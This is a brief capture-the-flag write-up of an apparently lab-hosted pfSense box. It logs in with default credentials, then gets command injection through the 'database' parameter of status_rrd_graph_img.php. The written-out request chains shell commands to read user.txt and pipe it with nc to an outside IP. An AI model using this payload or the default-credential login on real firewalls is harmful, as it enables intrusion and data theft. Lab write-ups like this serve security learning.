## Summary
This box focuses on exploiting a `pfsense`, first through weak credentials and then via rce through the `/status_rrd_graph_img.php?` endpoint.
## Foothold and root
We start out by doing an nmap port scan:

```console
┌──(bitis㉿workstation)-[~/Coding/BitisG.github.io]
└─$ nmap -sC -sV 10.129.147.167

When visiting the application we are greeted with the following:

After doing a scan with feroxbuster we find 2 interesting files: `changelog.txt` and `system-users.txt`:

```console
# Security Changelog 

### Issue
There was a failure in updating the firewall. Manual patching is therefore required

### Mitigated
2 of 3 vulnerabilities have been patched.

### Timeline
The remaining patches will be installed during the next maintenance window
```
{: file="changelog.txt"}

```console
####Support ticket###

Please create the following user


username: Rohit
password: company defaults
```
{: file="system-users.txt"}

Based on this information we can login as rohit with the credentials `rohit:pfsense`. A lot of vulnerabilities are present in pfsense. if we search the pfsense version for cve, we find a vulnerability, where apparently when using a get request on an image if we pass the query database, with value queues, we can simply do commands, like: 
GET /status_rrd_graph_img.php?database=queues;cd+..;cd+..;cd+..;cd+home;cd+rohit;cat+user.txt|nc+10.10.17.182+1337 HTTP/1.1

And likewise for the root flag. Rooted!
